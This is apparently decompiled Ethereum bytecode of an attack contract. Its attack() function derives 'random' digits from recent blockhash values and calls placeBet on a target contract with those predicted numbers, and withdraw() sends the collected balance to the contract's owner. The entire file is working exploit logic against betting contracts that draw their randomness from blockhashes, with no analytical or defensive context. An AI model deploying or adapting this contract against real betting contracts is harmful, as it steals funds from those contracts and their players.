contract main {


// =======================  Init code  ======================


address stor0;

function _fallback() {
    stor0 = msg.sender
    return code.data[94 len 1019]
}



// =====================  Runtime code  =====================


uint8 stor0;
uint8 stor0; offset 160
address stor0;

function _fallback() payable {
  stop
}

function withdraw() {
    require msg.sender == address(stor0.field_0)
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
}

function attack(address arg1, uint8 arg2) payable {
    uint8(stor0.field_160) = arg2
    if uint8(stor0.field_160) >= 255:
        idx = 31
        while idx >= 1:
            require idx < 32
            if Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) - 256 < 48:
                idx = idx - 1
                continue 
            require idx < 32
            if Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) - 256 > 57:
                idx = idx - 1
                continue 
            require idx < 32
            require ext_code.size(arg1)
            call arg1.placeBet(uint8 rg1, uint8 rg2) with:
               value msg.value wei
                 gas gas_remaining - 9710 wei
                args (Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) - 256) - 48 << 248, uint8((Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -255, 'number'))), 0) - 256) - 48)
            require ext_call.success
    else:
        if uint8(stor0.field_160) > 0:
            idx = 31
            while idx >= 1:
                require idx < 32
                if Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) - 256 < 48:
                    idx = idx - 1
                    continue 
                require idx < 32
                if Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) - 256 > 57:
                    idx = idx - 1
                    continue 
                require idx < 32
                require ext_code.size(arg1)
                call arg1.placeBet(uint8 rg1, uint8 rg2) with:
                   value msg.value wei
                     gas gas_remaining - 9710 wei
                    args (Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) - 256) - 48 << 248, uint8((Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', 'number', ('mul', -1, ('type', 8, ('field', 160, ('stor', ('name', 'stor0', 0)))))))), 0) - 256) - 48)
                require ext_call.success
        else:
            idx = 31
            while idx >= 1:
                require idx < 32
                if Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) - 256 < 48:
                    idx = idx - 1
                    continue 
                require idx < 32
                if Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) - 256 > 57:
                    idx = idx - 1
                    continue 
                require idx < 32
                require ext_code.size(arg1)
                call arg1.placeBet(uint8 rg1, uint8 rg2) with:
                   value msg.value wei
                     gas gas_remaining - 9710 wei
                    args (Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) - 256) - 48 << 248, uint8((Mask(8, -(('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) + 256, idx) << (('mask_shl', 256, 0, -3, ('blockhash', ('add', -1, 'number'))), 0) - 256) - 48)
                require ext_call.success
    require ext_code.size(arg1)
    call arg1.placeBet(uint8 rg1, uint8 rg2) with:
       value msg.value wei
         gas gas_remaining - 9710 wei
        args uint8(stor0.field_0), uint8(stor0.field_160)
    require ext_call.success
}



}
